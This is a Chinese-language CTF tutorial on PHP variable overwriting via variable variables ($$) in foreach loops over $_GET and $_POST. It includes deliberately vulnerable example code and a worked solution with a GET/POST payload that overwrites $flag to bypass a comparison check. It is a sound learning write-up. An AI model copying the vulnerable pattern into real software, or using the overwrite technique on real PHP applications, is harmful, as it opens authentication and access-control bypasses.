---
title: PHP 变量覆盖
date: 2026-11-24
---

# PHP 变量覆盖

## 可变变量：`$$`

**作用**

`$$`：用一个变量的值，作为另一个变量的变量名。

**例如**

```php
$flag = 'flag{hello_world}';
$a = 'flag';
echo $$a;          // 输出 flag{hello_world}
```

## 语言结构：`foreach()`

**作用**

遍历数组，把每个元素的键和值取出来。

**例如**

```php
$ary = array('a', 'b', 'c', 'c', 'e');

foreach ($ary as $key => $value) {
    echo $key;      // 输出 01234
}

foreach ($ary as $key => $value) {
    echo $value;    // 输出 abcce
}
```

我们在构造 GET 和 POST 请求时，提交的参数会被 PHP 解析成数组，分别放进 `$_GET` 和 `$_POST` 中。

## 最小示例：`$id` 被覆盖

```php
<?php
$id = 5;
foreach ($_GET as $key => $value) {
    $$key = $value;
}
echo $a;
?>
```

这里传入 `?id=1`：

- 那么 `$key = 'id'`，`$value = '1'`
- 所以 `$$key = $value` 就等于 `$id = '1'`
- 原本的 `$id = 5`，就被我们覆盖成了 `$id = '1'`

# 例题

```php
<?php
include "flag.php";
$_403 = "AccessDenied";
$_200 = "Welcome Admin";
if ($_SERVER["REQUEST_METHOD"] != "POST")
	die("BugsBunnyCTF is here :p…");
if ( !isset($_POST["flag"]) )
	die($_403);
foreach ($_GET as $key => $value)
	$$key = $$value;
foreach ($_POST as $key => $value)
	$$key = $value;
if ( $_POST["flag"] !== $flag )
	die($_403);
else
{
    echo "This is your flag : ". $flag . "\n";
    die($_200);
}
?>
```

## 解题思路

### 思路 1

利用

```php
foreach ($_GET as $key => $value)
	$$key = $$value;
```

目的是让 `$_200 = $flag`。

然后再利用这一步

```php
foreach ($_POST as $key => $value)
	$$key = $value;
```

把 `$flag` 覆盖成任意值：`$flag = 任意值`。

这样一来，比较时两边都是我们传的值，必然相等，

```php
if ( $_POST["flag"] !== $flag )
	die($_403);
```

然后走到

```php
echo "This is your flag : ". $flag . "\n";
die($_200);
```

因为 `$_200 = $flag`，所以 `die($_200)` 就会输出 flag。

### payload

```
GET:  ?_200=flag
POST: flag=aaa

---

参考文章：https://blog.csdn.net/qq_45089570/article/details/104858285?fromshare=blogdetail&sharetype=blogdetail&sharerId=104858285&sharerefer=PC&sharesource=2301_77409586&sharefrom=from_link
